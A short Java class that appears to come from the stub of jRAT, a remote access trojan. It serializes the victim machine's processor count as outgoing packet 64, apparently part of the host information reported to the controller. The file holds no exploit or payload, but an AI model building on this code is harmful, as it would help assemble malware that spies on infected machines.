package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet64InitAvailableProcessors extends AbstractOutgoingPacket {

	private int processors;

	public Packet64InitAvailableProcessors(int processors) {
		this.processors = processors;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeShort(processors);
	}

	@Override
	public byte getPacketId() {
		return (byte) 64;
	}
}
